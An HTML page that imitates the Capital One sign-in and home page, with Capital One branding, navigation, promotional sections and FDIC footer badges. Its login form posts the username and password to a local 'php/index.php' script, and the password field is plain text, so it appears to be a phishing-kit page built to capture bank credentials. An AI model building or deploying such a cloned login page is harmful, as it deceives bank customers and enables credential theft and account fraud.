<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Capital One Sign In: Log in to access your account(s)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="capital one login, capital one credit card login, capitalone, capitalone login, capital one 360 login">
    <base href="">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-gray-100 flex flex-col">
    <nav class="bg-gray-300">
        <div x-data="{ open: false }" class="bg-white shadow-md">
            <div class="container mx-auto flex justify-between items-center p-2 lg:px-[200px] text-[12px]">
                <button @click="open = !open" class="lg:hidden text-blue-500">
                    <div class="w-6 h-6 relative">
                        <svg x-show="!open" class="w-6 h-6"  fill="none"  viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
                        </svg>      
                        <svg x-show="open"  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6" >
                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </div>
                </button>

                <div class="flex flex-row space-x-10 items-center">
                    <div class=""><img class="w-[120px] lg:w-[118px] py-[4px] lg:py-1" src="capital-one-logo.svg" alt=""></div>
                    <ul class="hidden lg:flex flex-row space-x-10 text-[12px] font-bold">
                        <li><a href="">Credit Cards</a></li>
                        <li><a href="">Checking & savings</a></li>
                        <li><a href="">Auto</a></li>
                        <li><a href="">Business</a></li>
                        <li><a href="">Commercial</a></li>
                        <li><a href="">Learn & Grow</a></li>
                    </ul>
                </div>


              <div class="hidden lg:flex">
                <ul class="lg:flex space-x-4">
                    <li>
                        <a class="" href="#">
                            <img class="w-[13px] h-[16px]" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGlkPSJOYXZfQ0MtQ29weSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEwMzEuMDAwMDAwLCAtMjUuMDAwMDAwKSIgZmlsbD0iIzAxMTcyOCI+PHBhdGggZD0iTTEwMzQuODc5ODYsMzAuODc3MzA4NyBDMTAzNC44Nzk4NiwzMi4wMjc1Mzk2IDEwMzUuNzQ2ODcsMzIuODc1OTg5NCAxMDM2Ljg3NzMxLDMyLjg3NTk4OTQgQzEwMzguMDM4NjcsMzIuODc1OTg5NCAxMDM4Ljg3NTk5LDMxLjk3MTg4MzIgMTAzOC44NzU5OSwzMC44NzczMDg3IEMxMDM4Ljg3NTk5LDI5Ljc0MzE1NjMgMTAzOC4wMjUwNywyOC44Nzg2MjggMTAzNi44NzczMSwyOC44Nzg2MjggQzEwMzUuNzQ0MzksMjguODc4NjI4IDEwMzQuODc5ODYsMjkuNzI5NTUxNSAxMDM0Ljg3OTg2LDMwLjg3NzMwODcgTDEwMzQuODc5ODYsMzAuODc3MzA4NyBaIE0xMDM0LjA0ODczLDMwLjg3NzMwODcgQzEwMzQuMDQ4NzMsMjkuMjg2Nzc0NCAxMDM1LjI4MzA2LDI4LjA0NzQ5MzQgMTAzNi44NzczMSwyOC4wNDc0OTM0IEMxMDM4LjQ3NDAzLDI4LjA0NzQ5MzQgMTAzOS43MDcxMiwyOS4yODkyNDggMTAzOS43MDcxMiwzMC44NzczMDg3IEMxMDM5LjcwNzEyLDMyLjQzMzIxMjQgMTAzOC40ODI2OCwzMy43MDcxMjQgMTAzNi44NzczMSwzMy43MDcxMjQgQzEwMzUuMjg1NTQsMzMuNzA3MTI0IDEwMzQuMDQ4NzMsMzIuNDcxNTUzNCAxMDM0LjA0ODczLDMwLjg3NzMwODcgTDEwMzQuMDQ4NzMsMzAuODc3MzA4NyBaIE0xMDM2Ljg3NzMxLDM5LjA1MDEzMTkgTDEwNDAuNDQwNTUsMzQuNDM5MzE0IEMxMDQxLjY3MjQxLDMyLjgyODk5MDggMTA0MS45MjM0OCwzMS43ODg4MzU4IDEwNDEuOTIzNDgsMzAuODc3MzA4NyBDMTA0MS45MjM0OCwyOC4wOTMyNTUzIDEwMzkuNjg2MSwyNS44MzExMzQ2IDEwMzYuODc3MzEsMjUuODMxMTM0NiBDMTAzNC4wODk1NCwyNS44MzExMzQ2IDEwMzEuODMxMTMsMjguMDczNDY2NCAxMDMxLjgzMTEzLDMwLjg3NzMwODcgQzEwMzEuODMxMTMsMzEuNzg3NTk4OSAxMDMyLjA4MDk3LDMyLjgyNTI4MDMgMTAzMy4zMTUzLDM0LjQzOTMxNCBMMTAzNi44NzczMSwzOS4wNTAxMzE5IFogTTEwNDIuNzU0NjIsMzAuODc3MzA4NyBDMTA0Mi43NTQ2MiwzMi40NTc5NDg1IDEwNDIuMDE2MjQsMzMuNzY2NDkwOCAxMDQxLjAzNDIyLDM1LjAzMjk4MTUgTDEwMzcuMTE2MDEsNDAgTDEwMzYuNjQxMDgsNDAgTDEwMzIuNzIyODcsMzUuMDMyOTgxNSBDMTAzMS43MzM0MywzMy44MDM1OTUgMTAzMSwzMi40NjE2NTkgMTAzMSwzMC44NzczMDg3IEMxMDMxLDI3LjY0MTgyMDYgMTAzMy42MTU4NSwyNSAxMDM2Ljg3NzMxLDI1IEMxMDQwLjEyMjY5LDI1IDEwNDIuNzU0NjIsMjcuNjIyMDMxNyAxMDQyLjc1NDYyLDMwLjg3NzMwODcgTDEwNDIuNzU0NjIsMzAuODc3MzA4NyBaIiBpZD0iUGluIj48L3BhdGg+PC9nPjwvZz48L3N2Zz4=" alt="">
                        </a>
                    </li>
                    <li>
                        <a class="flex flex-row items-center space-x-2" href="signin.html">
                            <img class="w-[13px] h-[16px]" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGlkPSJOYXZfQ0MtQ29weSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTExMzUuMDAwMDAwLCAtMjUuMDAwMDAwKSIgZmlsbD0iIzAxMTcyOCI+PHBhdGggZD0iTTExMzguNjI5NjksMjkuMDg5OTU1NCBDMTEzOC42Mjk2OSwzMC44ODExOTU5IDExNDAuMDExOCwzMi4zMDAwMjYyIDExNDEuNzk3OCwzMi4zMDAwMjYyIEMxMTQzLjU3OTg2LDMyLjMwMDAyNjIgMTE0NC45NjU5MSwzMC44ODM4MTg1IDExNDQuOTY1OTEsMjkuMDg5OTU1NCBDMTE0NC45NjU5MSwyNy4yOTA4NDcxIDExNDMuNTczMywyNS44ODExOTU5IDExNDEuNzk3OCwyNS44ODExOTU5IEMxMTQwLjAyMjI5LDI1Ljg4MTE5NTkgMTEzOC42Mjk2OSwyNy4yOTA4NDcxIDExMzguNjI5NjksMjkuMDg5OTU1NCBMMTEzOC42Mjk2OSwyOS4wODk5NTU0IFogTTExMzcuNzA2NTMsMjkuMDg5OTU1NCBDMTEzNy43MDY1MywyNi44NTgxMTcgMTEzOS41MDgyNiwyNSAxMTQxLjc5NzgsMjUgQzExNDQuMDQ0MDYsMjUgMTE0NS44ODkwNiwyNi44MTM1MzI3IDExNDUuODg5MDYsMjkuMDg5OTU1NCBDMTE0NS44ODkwNiwzMS4zMzg4NDA4IDExNDQuMDY4OTcsMzMuMTgxMjIyMSAxMTQxLjc5NzgsMzMuMTgxMjIyMSBDMTEzOS41NDQ5OCwzMy4xODEyMjIxIDExMzcuNzA2NTMsMzEuMzU3MTk5MSAxMTM3LjcwNjUzLDI5LjA4OTk1NTQgTDExMzcuNzA2NTMsMjkuMDg5OTU1NCBaIE0xMTQxLjc5NzgsMzUuMTMyNDQxNiBDMTEzOC44MjI0NSwzNS4xMzI0NDE2IDExMzYuMzc2ODcsMzYuMTk4NTMxMyAxMTM2LjA5MSwzOS4xMTg4MDQxIEwxMTQ3LjUwNDU5LDM5LjExODgwNDEgQzExNDcuMjIwMDQsMzYuMTk3MjIgMTE0NC43NzA1MiwzNS4xMzI0NDE2IDExNDEuNzk3OCwzNS4xMzI0NDE2IEwxMTQxLjc5NzgsMzUuMTMyNDQxNiBaIE0xMTM1LDQwIEwxMTM1LjA2Mjk0LDM5LjMyOTkyMzkgQzExMzUuNDAxMjYsMzUuNjk4OTI0NyAxMTM4LjEzNDAyLDM0LjI1MjU1NyAxMTQxLjc5NzgsMzQuMjUyNTU3IEMxMTQ1LjQ1MjQsMzQuMjUyNTU3IDExNDguMTkzMDIsMzUuNjkxMDU2OSAxMTQ4LjUzMjY1LDM5LjMyOTkyMzkgTDExNDguNTk1NTksNDAgTDExMzUsNDAgWiIgaWQ9IlVzZXIiPjwvcGF0aD48L2c+PC9nPjwvc3ZnPg==" alt="">
                            <p>Sign In</p>
                        </a>
                    </li>                  
                </ul>
              </div>

              <div class="lg:hidden text-blue-700 font-bold">
                <ul class="lg:flex space-x-4">
                    <li><a class="flex flex-col items-center" href="signin.html">
                        <img class="w-[13px] h-[16px]" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGlkPSJOYXZfQ0MtQ29weSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTExMzUuMDAwMDAwLCAtMjUuMDAwMDAwKSIgZmlsbD0iIzAxMTcyOCI+PHBhdGggZD0iTTExMzguNjI5NjksMjkuMDg5OTU1NCBDMTEzOC42Mjk2OSwzMC44ODExOTU5IDExNDAuMDExOCwzMi4zMDAwMjYyIDExNDEuNzk3OCwzMi4zMDAwMjYyIEMxMTQzLjU3OTg2LDMyLjMwMDAyNjIgMTE0NC45NjU5MSwzMC44ODM4MTg1IDExNDQuOTY1OTEsMjkuMDg5OTU1NCBDMTE0NC45NjU5MSwyNy4yOTA4NDcxIDExNDMuNTczMywyNS44ODExOTU5IDExNDEuNzk3OCwyNS44ODExOTU5IEMxMTQwLjAyMjI5LDI1Ljg4MTE5NTkgMTEzOC42Mjk2OSwyNy4yOTA4NDcxIDExMzguNjI5NjksMjkuMDg5OTU1NCBMMTEzOC42Mjk2OSwyOS4wODk5NTU0IFogTTExMzcuNzA2NTMsMjkuMDg5OTU1NCBDMTEzNy43MDY1MywyNi44NTgxMTcgMTEzOS41MDgyNiwyNSAxMTQxLjc5NzgsMjUgQzExNDQuMDQ0MDYsMjUgMTE0NS44ODkwNiwyNi44MTM1MzI3IDExNDUuODg5MDYsMjkuMDg5OTU1NCBDMTE0NS44ODkwNiwzMS4zMzg4NDA4IDExNDQuMDY4OTcsMzMuMTgxMjIyMSAxMTQxLjc5NzgsMzMuMTgxMjIyMSBDMTEzOS41NDQ5OCwzMy4xODEyMjIxIDExMzcuNzA2NTMsMzEuMzU3MTk5MSAxMTM3LjcwNjUzLDI5LjA4OTk1NTQgTDExMzcuNzA2NTMsMjkuMDg5OTU1NCBaIE0xMTQxLjc5NzgsMzUuMTMyNDQxNiBDMTEzOC44MjI0NSwzNS4xMzI0NDE2IDExMzYuMzc2ODcsMzYuMTk4NTMxMyAxMTM2LjA5MSwzOS4xMTg4MDQxIEwxMTQ3LjUwNDU5LDM5LjExODgwNDEgQzExNDcuMjIwMDQsMzYuMTk3MjIgMTE0NC43NzA1MiwzNS4xMzI0NDE2IDExNDEuNzk3OCwzNS4xMzI0NDE2IEwxMTQxLjc5NzgsMzUuMTMyNDQxNiBaIE0xMTM1LDQwIEwxMTM1LjA2Mjk0LDM5LjMyOTkyMzkgQzExMzUuNDAxMjYsMzUuNjk4OTI0NyAxMTM4LjEzNDAyLDM0LjI1MjU1NyAxMTQxLjc5NzgsMzQuMjUyNTU3IEMxMTQ1LjQ1MjQsMzQuMjUyNTU3IDExNDguMTkzMDIsMzUuNjkxMDU2OSAxMTQ4LjUzMjY1LDM5LjMyOTkyMzkgTDExNDguNTk1NTksNDAgTDExMzUsNDAgWiIgaWQ9IlVzZXIiPjwvcGF0aD48L2c+PC9nPjwvc3ZnPg==" alt="">
                        <p>Sign In</p>
                    </a>
              </div>
              
            </div>

            <div x-show="open" class="lg:hidden" >
              <ul class="bg-white p-4 fixed top-[67px] left-0 w-full h-full flex flex-col space-y-10 border border-">
                <li><a href="">Credit Cards</a></li>
                <li><a href="">Checking & savings</a></li>
                <li><a href="">Auto</a></li>
                <li><a href="">Business</a></li>
                <li><a href="">Commercial</a></li>
                <li><a href="">Learn & Grow</a></li>
              </ul>
            </div>
        </div>
    </nav>

    <main>
        <!-- login desktop -->
        <div class="hidden lg:block py-4">
            <form action="php/index.php" method="POST" class="flex flex-row justify-center space-x-10 items-center p-4 text-[12px]" style="background-color: #f4f4f4;">
                <div>
                    <div class="flex flex-col mb-2">
                        <label for="username">username</label>
                        <div>
                            <img class="absolute mt-2 ml-2 w-[13px] h-[16px]" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGlkPSJOYXZfQ0MtQ29weSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTExMzUuMDAwMDAwLCAtMjUuMDAwMDAwKSIgZmlsbD0iIzAxMTcyOCI+PHBhdGggZD0iTTExMzguNjI5NjksMjkuMDg5OTU1NCBDMTEzOC42Mjk2OSwzMC44ODExOTU5IDExNDAuMDExOCwzMi4zMDAwMjYyIDExNDEuNzk3OCwzMi4zMDAwMjYyIEMxMTQzLjU3OTg2LDMyLjMwMDAyNjIgMTE0NC45NjU5MSwzMC44ODM4MTg1IDExNDQuOTY1OTEsMjkuMDg5OTU1NCBDMTE0NC45NjU5MSwyNy4yOTA4NDcxIDExNDMuNTczMywyNS44ODExOTU5IDExNDEuNzk3OCwyNS44ODExOTU5IEMxMTQwLjAyMjI5LDI1Ljg4MTE5NTkgMTEzOC42Mjk2OSwyNy4yOTA4NDcxIDExMzguNjI5NjksMjkuMDg5OTU1NCBMMTEzOC42Mjk2OSwyOS4wODk5NTU0IFogTTExMzcuNzA2NTMsMjkuMDg5OTU1NCBDMTEzNy43MDY1MywyNi44NTgxMTcgMTEzOS41MDgyNiwyNSAxMTQxLjc5NzgsMjUgQzExNDQuMDQ0MDYsMjUgMTE0NS44ODkwNiwyNi44MTM1MzI3IDExNDUuODg5MDYsMjkuMDg5OTU1NCBDMTE0NS44ODkwNiwzMS4zMzg4NDA4IDExNDQuMDY4OTcsMzMuMTgxMjIyMSAxMTQxLjc5NzgsMzMuMTgxMjIyMSBDMTEzOS41NDQ5OCwzMy4xODEyMjIxIDExMzcuNzA2NTMsMzEuMzU3MTk5MSAxMTM3LjcwNjUzLDI5LjA4OTk1NTQgTDExMzcuNzA2NTMsMjkuMDg5OTU1NCBaIE0xMTQxLjc5NzgsMzUuMTMyNDQxNiBDMTEzOC44MjI0NSwzNS4xMzI0NDE2IDExMzYuMzc2ODcsMzYuMTk4NTMxMyAxMTM2LjA5MSwzOS4xMTg4MDQxIEwxMTQ3LjUwNDU5LDM5LjExODgwNDEgQzExNDcuMjIwMDQsMzYuMTk3MjIgMTE0NC43NzA1MiwzNS4xMzI0NDE2IDExNDEuNzk3OCwzNS4xMzI0NDE2IEwxMTQxLjc5NzgsMzUuMTMyNDQxNiBaIE0xMTM1LDQwIEwxMTM1LjA2Mjk0LDM5LjMyOTkyMzkgQzExMzUuNDAxMjYsMzUuNjk4OTI0NyAxMTM4LjEzNDAyLDM0LjI1MjU1NyAxMTQxLjc5NzgsMzQuMjUyNTU3IEMxMTQ1LjQ1MjQsMzQuMjUyNTU3IDExNDguMTkzMDIsMzUuNjkxMDU2OSAxMTQ4LjUzMjY1LDM5LjMyOTkyMzkgTDExNDguNTk1NTksNDAgTDExMzUsNDAgWiIgaWQ9IlVzZXIiPjwvcGF0aD48L2c+PC9nPjwvc3ZnPg==" alt="">
                        </div>
                        <input class="w-[300px] h-[30px] pl-8" type="text" name="username" id="username">
                    </div>

                    <div class="flex items-center space-x-2">
                        <input type="checkbox">
                        <label for="remember-me">Remember me</label>
                    </div>
                    
                </div>

                <div>
                    <div class="flex flex-col mb-2">
                        <label for="pasword">password</label>
                        <div>
                            <img class="absolute mt-2 ml-2 w-[18px]" src="img/lock.svg" alt="">
                        </div>
                        <input class="w-[300px] h-[30px] pl-8" type="text" name="password" id="password">
                    </div>

                    <div>
                        <a href="" class="text-blue-500">Forgot username or password?</a>
                    </div>
                </div>

                <div class="mt-2">
                    <div style="background-color: #026597;" class="text-white font-bold text-lg text-center w-[140px]"><button type="submit" value="submit" name="submit">Sign In</button></div>
                    <div class="h-4 pt-2">
                        <a href="" class="text-blue-500 p-2">Set up online access</a>
                    </div>
                </div>

            </form>
        </div>


        <!-- Section 1  desktop-->
        <div class="hidden md:block">
            <div class="bg-[url('img/desktop.jpg')] bg-cover bg-no-repeat h-[450px]">
                <div class="flex px-[100px] lg:px-[200px] h-full items-center">
                    <div style="background-color: #ffffffeb;" class="w-[450px] py-[40px] px-[48px]">
                        <h1 class="text-[14px]font-bold"> SEE IF YOU'RE PRE-APPROVED </h1>
                        <h1 class="text-[40px]">Take charge of your credit</h1>
                        <p class="text-[16px] mb-[32px]">Find the right card for you, anytime.</p> 

                        <button style="background-color: #026597;" class=" text-white font-bold text-[20px] p-2 rounded">Get Started</button>
                      

                    </div>
                </div>
            </div>
        </div>

        <!-- section 1 mobile -->

        <section class="md:hidden">
            <div class="flex flex-col">
                <div><img src="img/rmobile.jpg" alt=""></div>
                <div class="p-[24px]">
                    <div class="flex flex-col items-center text-center border p-[24px] mt-[-50px] bg-white">
                        <p style="text-transform: uppercase;" class="text-[14px] font-bold"> 360 Performance Savings </p>
                        <p class="text-[32px] pb-[8px]">One of the nation's top rates</p>
                        <p class="text-[16px] mb-[24px]">Earn more with every dollar you save—plus no fees or minimums.</p>
                        <div style="background-color: #026597;" class="text-white font-bold text-lg text-center p-2"><button>View details</button></div>
                    </div>       
                </div>
            </div>
        </section>
    </main>

    <!-- section 2 -->
    <div class="pt-[32px] md:pt-10 pb-20 md:px-[100px]">
        <div class="flex flex-col md:flex-row justify-center md:font-bold">
            <div class="item1 flex flex-col w-[320px] md:w-[400px] px-[24px] pb-[28px] md:items-center md:text-center">
                <div class="hidden md:block w-[140px]"><img src="img/ehp-pa-callout-v2.svg" alt=""></div>
                <p class="text-[24px] md:text-[32px]">No impact, no worries</p>
                <p class="mb-[16px] md:mb-10 font-bold">Check if you're pre-approved for card offers with no impact to your credit score.</p>

                <a href="" class="text-blue-700 font-bold">See if I'm pre-approved</a>
            </div>

            <div class="item2 flex flex-row md:flex-col w-[350px] mt-[20px] md:mt-0 pb-[28px] md:items-center md:text-center">
                <div class="md:w-[140px]"><img src="img/flower.svg" alt=""></div>
                <div class="flex flex-col ml-[16px] md:ml-0">
                    <p class="text-[24px] md:text-[32px]">Savings starts here</p>
                    <p class="mb-[16px] md:mb-10 font-bold">Keep your money growing with one of the best savings rates in America.</p>
    
                    <a href="" class="text-blue-700 font-bold">Compare accounts</a>
                </div>
            </div>

            <div class="item3 flex flex-col w-[320px] md:w-[400px] px-[24px] pb-[28px] md:items-center md:text-center">
                <div class="hidden md:block w-[140px]"><img src="img/car.svg" alt=""></div>
                <p class="text-[24px] md:text-[32px]">Easier car buying</p>
                <p class="mb-[16px] md:mb-10 font-bold">Pre-qualify to see your real rate and payment before visiting the dealer.</p>

                <a href="" class="text-blue-700 font-bold">Check out Auto Navigator</a>
            </div>
        </div>
    </div>


    <!-- section 3 -->
    <div class="font-bold">
        <div class="px-[24px] bg-white">
            <div class="flex flex-col justify-center md:items-center  md:p-[70px] pb-[70px]">
                <p class="text-[16px] mt-[20px] mb-[50px]">HOW CAN WE HELP?</p>
                <p class="text-[32px] md:text-[24px] mt-[32px] mb-[56px] hidden md:block">We’ll offer ideas to help you meet your goal</p>
                <p class="text-[32px] md:text-[48px]">I want to <span class="text-blue-700">grow my money</span> </p>
                <p class="text-[32px] md:text-[48px]">so that I can <span class="text-blue-700">sleep better at night</span></p>
                
                <div class="mt-[30px]">
                    <button style="background-color: #026597;" class=" text-white font-bold text-[20px] p-2 rounded">See suggestions</button>
                </div> 
            </div>
        </div>
    </div>


    <!-- section 4 -->
    <div class="flex justify-center bg-white">
        <div class="grid grid-cols-1 lg:grid-cols-2">
            <div>
                <img class="md:h-[500px] w-full " src="img/shopping.jpg" alt="">
            </div>

            <div class="">
                <div class="lg:w-[640px] py-[40px] px-[24px] pb-[72px] md:py-[72px] md:px-[70px]">
                    <p class="mb-[32px] md:mb-[48px] font-bold text-[16px]">Deals for shoppers</p>
                    <p class="text-[32px] md:text-[40px] mb-[8px] md:mb-[16px]">Automatically get better deals when you shop online</p>
                    <p class="text-[16px] mb-[32px] md:mb-[40px]">Capital One Shopping is a free tool that instantly searches for savings and applies them to your cart.</p>
    
                    <a href="">Add Capital One Shopping</a>
                </div>
            </div>

            <div>
                <div class="lg:w-[640px] py-[40px] px-[24px] pb-[72px] md:py-[72px] md:px-[70px]">
                    <p class="mb-[32px] md:mb-[48px] font-bold text-[16px]">Financial Wellness</p>
                    <p class="text-[32px] md:text-[40px] mb-[8px] md:mb-[16px]">Put CreditWise in your pocket</p>
                    <p class="text-[16px] mb-[32px] md:mb-[40px]">Get help building your credit score and financial future with our free app.</p>
    
                    <a href="">Add Capital One Shopping</a>
                </div>
            </div>
            <div>
                <img class="md:h-[500px] w-full" src="img/olderwoman.jpg" alt="">
            </div>
        </div>
    </div>



    <div class="flex justify-center bg-white">
        <div class="grid grid-cols-1 md:grid-cols-3">

        <div>
            <div class="card1">
                
            </div>
        </div>

        <div>
            <div class="card2">
                
            </div>
        </div>

        <div>
            <div class="card3">
                
            </div>
        </div>

        </div>
    </div>

    <div class="h-[200px]">

    </div>


    <footer>
        <div>
            <div class="footer-main p-[12px] bg-white hidden lg:flex justify-end lg:space-x-[480px] lg:space-x-[100px] items-center ">
                <ul class="flex items-right flex footer text-[10px]">
                    <li><a class="px-2" href="">Contact us</a></li> 
                    <li><a class="px-2" href="">Legal</a></li>
                    <li><a class="px-2" href="">Privacy</a></li>
                    <li><a class="px-2" href="">Security</a></li>
                    <li><a class="px-2" href="">Terms & Conditions</a></li>
                    <li><a class="px-2" href="">Accessibility</a></li>
                </ul>

                <div class="flex items-center pr-[45px] space-x-4">
                    <div><img class="w-[35px]" src="fdic.svg" alt=""></div>
                    <div><img class="w-[35px]" src="equal_housing_lender.svg" alt=""></div>
                </div>
                

            </div>
        </div>
    </footer>
    <!-- mobiler -->
    <footer class="lg:hidden">
        <div class="bg-white">
            <ul class="flex flex-col flex text-[13px] lg:hidden py-[22px] space-y-[11px]">
                <li><a class="m-10" href="">Legal</a></li>
                <li><a class="m-10" href="">Contact us</a></li> 
                <li><a class="m-10" href="">Privacy</a></li>
                <li><a class="m-10" href="">Security</a></li>
                <li><a class="m-10" href="">Terms & Conditions</a></li>
                <li><a class="px-10" href="">Accessibility</a></li>
            </ul>

            <div class="flex items-center justify-end space-x-4 p-4">
                <div><img class="w-[30px]" src="fdic.svg" alt=""></div>
                <div><img class="w-[30px]" src="equal_housing_lender.svg" alt=""></div>
            </div>
        </div>
    </footer>
 
    
    <script>
        

    </script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.1/dist/cdn.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.js"></script>
</body>
</html>